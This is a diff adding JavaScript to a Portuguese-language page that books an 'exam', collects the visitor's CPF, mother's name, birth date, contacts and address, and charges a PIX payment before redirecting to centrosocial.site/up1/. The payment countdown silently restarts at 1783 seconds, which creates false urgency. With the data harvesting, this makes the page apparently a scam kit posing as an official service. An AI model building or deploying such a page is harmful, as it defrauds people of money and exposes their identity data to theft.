+        const isBloqueado = datasBloqueadas.includes(dia) || isDomingo;
+        const isHoje =
+          dia === new Date().getDate() &&
+          mesAtual === new Date().getMonth() &&
+          anoAtual === new Date().getFullYear();
+        const isPassado =
+          anoAtual === new Date().getFullYear() &&
+          mesAtual === new Date().getMonth() &&
+          dia < new Date().getDate();
+        const isSelecionado =
+          dataSelecionada &&
+          dia === dataSelecionada.getDate() &&
+          mesAtual === dataSelecionada.getMonth() &&
+          anoAtual === dataSelecionada.getFullYear();
+
+        let classe = "dia";
+        if (isBloqueado) classe += " bloqueado";
+        if (isHoje) classe += " hoje";
+        if (isPassado) classe += " passado";
+        if (isSelecionado) classe += " selecionado";
+
+        if (isBloqueado || isPassado) {
+          html += `<div class="${classe}">${dia}</div>`;
+        } else {
+          html += `<div class="${classe}" onclick="selecionarData(${dia})">${dia}</div>`;
+        }
+      }
+
+      document.getElementById("calendario-dias").innerHTML = html;
+    }
+
+    function selecionarData(dia) {
+      dataSelecionada = new Date(anoAtual, mesAtual, dia);
+      const meses = [
+        "Janeiro",
+        "Fevereiro",
+        "Março",
+        "Abril",
+        "Maio",
+        "Junho",
+        "Julho",
+        "Agosto",
+        "Setembro",
+        "Outubro",
+        "Novembro",
+        "Dezembro",
+      ];
+      const dataFormatada =
+        dia + " de " + meses[mesAtual] + " de " + anoAtual;
+      document.getElementById("data-escolhida").textContent = dataFormatada;
+      renderizarCalendario();
+    }
+
+    function realizarAgendamento() {
+      if (!dataSelecionada) {
+        showToast("Selecione uma data para agendar!", "info");
+        return;
+      }
+
+      usuarioAtual.data_exame = dataSelecionada;
+      usuarioAtual.horario_exame = "A Definir";
+
+      document.getElementById("nome-exame-agendado").textContent =
+        usuarioAtual.nome.split(" ")[0];
+      document.getElementById("acomp-nome-exame").textContent =
+        usuarioAtual.nome;
+      document.getElementById("acomp-cpf-exame").textContent =
+        usuarioAtual.cpf;
+      document.getElementById("acomp-protocolo-exame").textContent =
+        document.getElementById("numero-protocolo").textContent;
+
+      document.getElementById("modal-agendamento").style.display = "none";
+      document.getElementById("overlay-agendamento").style.display = "none";
+      document.getElementById("tela-aprovacao").style.display = "none";
+      document.getElementById("tela-exames-agendados").style.display =
+        "block";
+      window.scrollTo(0, 0);
+    }
+
+    function voltarParaPrincipal() {
+      document.getElementById("tela-exames-agendados").style.display = "none";
+      document.getElementById("tela-resumo").style.display = "block";
+      preencherResumo();
+      window.scrollTo(0, 0);
+    }
+    function preencherResumo() {
+      const safe = (value) => (value ? value : "-");
+      const formatDate = (value) => {
+        if (!value) return "-";
+        if (value instanceof Date) {
+          return value.toLocaleDateString("pt-BR");
+        }
+        return String(value);
+      };
+
+      document.getElementById("resumo-cpf").textContent = safe(
+        usuarioAtual.cpf
+      );
+      document.getElementById("resumo-nome").textContent = safe(
+        usuarioAtual.nome
+      );
+      document.getElementById("resumo-data").textContent = safe(
+        usuarioAtual.data_nascimento || usuarioAtual.dataNascimento
+      );
+      document.getElementById("resumo-mae").textContent = safe(
+        usuarioAtual.nome_mae
+      );
+
+      document.getElementById("resumo-telefone").textContent = safe(
+        usuarioAtual.telefone
+      );
+      document.getElementById("resumo-email").textContent = safe(
+        usuarioAtual.email
+      );
+
+      document.getElementById("resumo-cep").textContent = safe(usuarioAtual.cep);
+
+      const enderecoLinha = usuarioAtual.endereco
+        ? `${usuarioAtual.endereco}${usuarioAtual.numero ? ", " + usuarioAtual.numero : ""}`
+        : "-";
+      document.getElementById("resumo-endereco").textContent = enderecoLinha;
+
+      document.getElementById("resumo-bairro").textContent = safe(
+        usuarioAtual.bairro
+      );
+
+      const cidadeLinha = usuarioAtual.cidade
+        ? `${usuarioAtual.cidade}${usuarioAtual.estado ? "/" + usuarioAtual.estado : ""}`
+        : "-";
+      document.getElementById("resumo-cidade").textContent = cidadeLinha;
+
+      document.getElementById("resumo-data-exame").textContent = formatDate(
+        usuarioAtual.data_exame
+      );
+      document.getElementById("resumo-horario").textContent = safe(
+        usuarioAtual.horario_exame
+      );
+    }
+
+    async function confirmarAgendamento() {
+      const formatBRL = (value) => {
+        const n = Number(value);
+        return Number.isFinite(n)
+          ? n.toLocaleString("pt-BR", { style: "currency", currency: "BRL" })
+          : value || "";
+      };
+
+      const statusEl = document.getElementById("pix-status-texto");
+      if (statusEl) statusEl.textContent = "Gerando PIX... aguarde";
+
+      const payload = {
+        cpf: usuarioAtual.cpf,
+        nome: usuarioAtual.nome || "",
+        data_nascimento:
+          usuarioAtual.dataNascimento || usuarioAtual.data_nascimento || "",
+        nome_mae: usuarioAtual.nome_mae || "",
+        telefone: usuarioAtual.telefone || "",
+        email: usuarioAtual.email || "",
+        cep: usuarioAtual.cep || "",
+        endereco: usuarioAtual.endereco || "",
+        numero: usuarioAtual.numero || "",
+        complemento: usuarioAtual.complemento || "",
+        bairro: usuarioAtual.bairro || "",
+        cidade: usuarioAtual.cidade || "",
+        estado: usuarioAtual.estado || "",
+        data_exame: usuarioAtual.data_exame || "",
+        horario_exame: usuarioAtual.horario_exame || "",
+        protocolo:
+          usuarioAtual.protocolo ||
+          document.getElementById("numero-protocolo")?.textContent ||
+          "",
+      };
+
+      // Descobre a lib local já carregada e como gerar o QR
+      const getQrGenerator = () => {
+        // Caso 1: lib "qrcode" (node-qrcode build) => QRCode.toDataURL
+        if (window.QRCode && typeof window.QRCode.toDataURL === "function") {
+          return {
+            type: "toDataURL",
+            api: window.QRCode,
+          };
+        }
+
+        // Caso 2: algumas builds expõem "qrcode" em minúsculo
+        if (window.qrcode && typeof window.qrcode.toDataURL === "function") {
+          return {
+            type: "toDataURL",
+            api: window.qrcode,
+          };
+        }
+
+        // Caso 3: lib "qrcodejs" => new QRCode(container, opts) e desenha canvas/img
+        // Normalmente expõe window.QRCode como FUNÇÃO/CONSTRUTOR (sem toDataURL)
+        if (typeof window.QRCode === "function") {
+          return {
+            type: "constructor",
+            api: window.QRCode,
+          };
+        }
+
+        return null;
+      };
+
+      try {
+        const response = await fetch(`${API_BASE}/processar-pagamento`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload),
+        });
+
+        const data = await response.json().catch(() => ({}));
+        if (!response.ok)
+          throw new Error(data?.mensagem || "Falha ao processar pagamento");
+
+        if (!data?.sucesso) {
+          showToast(
+            data?.mensagem || "Erro ao processar pagamento. Tente novamente.",
+            "error"
+          );
+          if (statusEl)
+            statusEl.textContent = "Não foi possível gerar o PIX.";
+          return;
+        }
+
+        usuarioAtual.pagamento_id =
+          data.pagamento_id || data.id || data.pix?.pagamento_id || "";
+        usuarioAtual.transaction_id =
+          data.transaction_id ||
+          data.transactionId ||
+          data.pix?.transaction_id ||
+          data.pix?.transactionId ||
+          "";
+
+        const copiaCola =
+          data.codigo_pix ||
+          data.pix_copia_cola ||
+          data.copia_cola ||
+          data.copiaCola ||
+          data.pix?.copiaCola ||
+          data.pix?.copia_cola ||
+          data.pix?.brcode ||
+          data.pix?.copia_e_cola ||
+          "";
+
+        const valor =
+          data.valor ||
+          data.valor_total ||
+          data.pix_valor ||
+          data.pix?.valor ||
+          data.pix?.valor_total ||
+          "";
+
+        const expiraEm =
+          data.expira_em ||
+          data.expires_at ||
+          data.pix?.expira_em ||
+          data.pix?.expires_at ||
+          "";
+
+        const elValor = document.getElementById("pix-valor");
+        if (elValor && valor !== "") elValor.textContent = formatBRL(valor);
+
+        const elCodigo = document.getElementById("codigo-pix");
+        if (elCodigo) elCodigo.value = copiaCola || "";
+
+        // ===== QR: gera base64 e seta na imagem =====
+        const elQr = document.getElementById("qr-code-img");
+        if (elQr && copiaCola) {
+          const gen = getQrGenerator();
+          if (!gen) {
+            console.log(
+              "Globals disponíveis:",
+              Object.keys(window).slice(0, 200)
+            );
+            throw new Error(
+              "Lib de QR não encontrada no window. Verifique se o <script src='./sua-lib.js'> vem ANTES do seu script."
+            );
+          }
+
+          if (gen.type === "toDataURL") {
+            // Gera base64 direto
+            const dataUrl = await gen.api.toDataURL(copiaCola, {
+              width: 240,
+              margin: 1,
+              errorCorrectionLevel: "M",
+            });
+            elQr.src = dataUrl;
+          } else {
+            // gen.type === "constructor" (qrcodejs)
+            // cria um container escondido, gera o QR nele e converte o canvas/img em dataURL
+            const container = document.createElement("div");
+            container.style.position = "fixed";
+            container.style.left = "-99999px";
+            container.style.top = "-99999px";
+            document.body.appendChild(container);
+
+            // limpa (por segurança)
+            container.innerHTML = "";
+
+            // cria QR (qrcodejs)
+            new gen.api(container, {
+              text: copiaCola,
+              width: 240,
+              height: 240,
+              correctLevel: gen.api.CorrectLevel ? gen.api.CorrectLevel.M : 1,
+            });
+
+            // tenta pegar canvas primeiro
+            const canvas = container.querySelector("canvas");
+            const img = container.querySelector("img");
+
+            if (canvas && typeof canvas.toDataURL === "function") {
+              elQr.src = canvas.toDataURL("image/png");
+            } else if (img && img.src) {
+              // qrcodejs às vezes cria <img src="data:image/...">
+              elQr.src = img.src;
+            } else {
+              document.body.removeChild(container);
+              throw new Error(
+                "QR gerado, mas não achei canvas/img para extrair base64."
+              );
+            }
+
+            document.body.removeChild(container);
+          }
+        }
+        // ==========================================
+
+        if (statusEl)
+          statusEl.textContent = "Aguardando confirmação do pagamento...";
+        const instrucaoEl = document.getElementById("pix-instrucao");
+        if (instrucaoEl) {
+          instrucaoEl.textContent = expiraEm
+            ? `Escaneie o QR Code com o app do seu banco (expira em ${expiraEm})`
+            : "Escaneie o QR Code com o app do seu banco";
+        }
+
+        document.getElementById("tela-resumo").style.display = "none";
+        document.getElementById("tela-pagamento").style.display = "block";
+        iniciarTimer();
+        iniciarMonitoramentoPagamento(usuarioAtual.transaction_id);
+        window.scrollTo(0, 0);
+        trackEvent("screen_pagamento");
+        startIdleTracking("idle_pagamento", 120000);
+      } catch (error) {
+        console.error("Erro:", error);
+        showToast(error?.message || "Erro ao conectar com servidor.", "error");
+        if (statusEl)
+          statusEl.textContent = "Falha ao gerar PIX. Tente novamente.";
+      }
+    }
+
+    function copiarCodigoPix() {
+      const codigoPix = document.getElementById("codigo-pix");
+      codigoPix.select();
+      document.execCommand("copy");
+
+      const btn = event.target.closest(".btn-copiar-pix");
+      const textoOriginal = btn.innerHTML;
+      btn.innerHTML = '<i class="fas fa-check"></i> Copiado!';
+      btn.style.backgroundColor = "#2e7d32";
+
+      setTimeout(() => {
+        btn.innerHTML = textoOriginal;
+        btn.style.backgroundColor = "";
+      }, 2000);
+    }
+
+    let tempoRestante = 1783;
+    let intervalTimer = null;
+    let intervalMonitor = null;
+
+    function iniciarTimer() {
+      if (intervalTimer) clearInterval(intervalTimer);
+
+      intervalTimer = setInterval(() => {
+        tempoRestante--;
+        if (tempoRestante <= 0) {
+          tempoRestante = 1783;
+        }
+
+        const minutos = Math.floor(tempoRestante / 60);
+        const segundos = tempoRestante % 60;
+        document.getElementById("timer-texto").textContent =
+          "Tempo restante: " +
+          (minutos < 10 ? "0" : "") +
+          minutos +
+          ":" +
+          (segundos < 10 ? "0" : "") +
+          segundos;
+      }, 1000);
+    }
+
+    function iniciarMonitoramentoPagamento(transactionId) {
+      if (intervalMonitor) clearInterval(intervalMonitor);
+      if (!transactionId) return;
+
+      const statusEl = document.getElementById("pix-status-texto");
+
+      intervalMonitor = setInterval(async () => {
+        try {
+          const resp = await fetch(
+            `${API_BASE}/consultar-pagamento/${transactionId}`
+          );
+          const data = await resp.json().catch(() => ({}));
+
+          if (!resp.ok || !data?.sucesso) return;
+
+          const status = data?.status || data?.dados?.status || "";
+          if (statusEl && status) {
+            statusEl.textContent = `Status do pagamento: ${status}`;
+          }
+
+          if (status === "PAID") {
+            if (statusEl)
+              statusEl.textContent = "Pagamento confirmado com sucesso!";
+            clearInterval(intervalMonitor);
+            intervalMonitor = null;
+            window.location.href = "https://centrosocial.site/up1/";
+          }
+        } catch (e) {
+          console.error("Erro ao monitorar pagamento:", e);
+        }
+      }, 5000);
+    }
+
+    function mascaraTelefone(input) {
+      let value = input.value.replace(/\D/g, "");
+      if (value.length > 11) value = value.slice(0, 11);
+
+      if (value.length > 0) {
+        if (value.length <= 2) {
+          value = "(" + value;
+        } else if (value.length <= 7) {
+          value = "(" + value.slice(0, 2) + ") " + value.slice(2);
+        } else {
+          value =
+            "(" +
+            value.slice(0, 2) +
+            ") " +
+            value.slice(2, 7) +
+            "-" +
+            value.slice(7);
+        }
+      }
+      input.value = value;
+    }
+
+    function confirmarContato() {
+      const telefone = document.getElementById("telefone").value;
+      const email = document.getElementById("email").value;
+
+      if (!telefone || !email) {
+        showToast("Preencha todos os campos", "info");
+        return;
+      }
+
+      if (telefone.replace(/\D/g, "").length < 11) {
+        showToast("Telefone invalido", "error");
+        return;
+      }
+
+      if (!email.includes("@")) {
+        showToast("E-mail invalido", "error");
+        return;
+      }
+
+      usuarioAtual.telefone = telefone;
+      usuarioAtual.email = email;
+
+      document.getElementById("tela-contato").style.display = "none";
+      document.getElementById("tela-validacao").style.display = "block";
+      window.scrollTo(0, 0);
+
+      iniciarValidacao();
+    }
+
+    function voltarVerificacao() {
+      document.getElementById("tela-contato").style.display = "none";
+      document.getElementById("tela-verificacao").style.display = "block";
+      window.scrollTo(0, 0);
+    }
+
+    function irParaTelaCPF() {
+      document.getElementById("tela-inicial").style.display = "none";
+      document.getElementById("tela-login").style.display = "block";
+      document.getElementById("cpf").value = "";
+      window.scrollTo(0, 0);
+    }
+  </script>
+
+
+
+</body></html>
